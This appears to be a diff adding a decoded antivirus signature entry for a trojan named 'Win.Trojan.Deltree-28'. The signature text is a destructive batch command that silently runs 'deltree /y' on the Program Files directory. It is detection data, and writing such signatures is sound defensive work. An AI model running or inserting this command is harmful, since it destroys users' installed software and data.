@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Deltree-28
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off if exist c:\program files\*.* deltree /y c:\program files\*.*
